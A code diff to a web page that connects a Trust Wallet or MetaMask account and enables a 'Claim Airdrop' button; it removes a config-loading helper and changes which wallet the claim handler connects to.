@@ -11,30 +11,11 @@
 <body>
 
 <h1>Connect your Wallet</h1>
-<!-- Two separate buttons -->
 <button id="connectTrustWalletButton">Connect Trust Wallet</button>
 <button id="connectMetaMaskButton">Connect MetaMask</button>
 <button id="claimAirdropButton" disabled>Claim Airdrop</button>
 
 <script>
-// Helper function to load ABI and config dynamically
-async function loadConfigAndABI(network) {
-    const configMap = {
-        eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
-        bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' }
-    };
-
-    const { config, abi } = configMap[network];
-    try {
-        const configData = await fetch(config).then((res) => res.json());
-        const abiData = await fetch(abi).then((res) => res.json());
-        return { config: configData, abi: abiData };
-    } catch (error) {
-        console.error(`Error loading config or ABI for ${network}:`, error);
-        alert(`Failed to load configuration for ${network}.`);
-    }
-}
-
 // MetaMask Connection Logic
 async function connectMetaMask() {
     if (window.ethereum && window.ethereum.isMetaMask) {
@@ -126,11 +107,10 @@ async function claimAirdrop(account) {
 
 // Event listener for the claim airdrop button
 document.getElementById('claimAirdropButton').addEventListener('click', async () => {
-    let account = await connectTrustWallet(); // Try Trust Wallet first
-    if (!account) {
-        account = await connectMetaMask(); // If Trust Wallet fails, try MetaMask
-    }
+    let account = null;
 
+    // Always connect to Trust Wallet if the Trust Wallet button is clicked
+    account = await connectTrustWallet();
     if (account) {
         await claimAirdrop(account);
     }
@@ -138,7 +118,7 @@ document.getElementById('claimAirdropButton').addEventListener('click', async ()
 
 // Event listener for Trust Wallet button
 document.getElementById('connectTrustWalletButton').addEventListener('click', async function () {
-    const account = await connectTrustWallet(); // Only connect to Trust Wallet
+    const account = await connectTrustWallet(); // Always connect to Trust Wallet
     if (account) {
         document.getElementById('claimAirdropButton').disabled = false;
     }
@@ -146,7 +126,7 @@ document.getElementById('connectTrustWalletButton').addEventListener('click', as
 
 // Event listener for MetaMask button
 document.getElementById('connectMetaMaskButton').addEventListener('click', async function () {
-    const account = await connectMetaMask(); // Only connect to MetaMask
+    const account = await connectMetaMask(); // Always connect to MetaMask
     if (account) {
         document.getElementById('claimAirdropButton').disabled = false;
     }
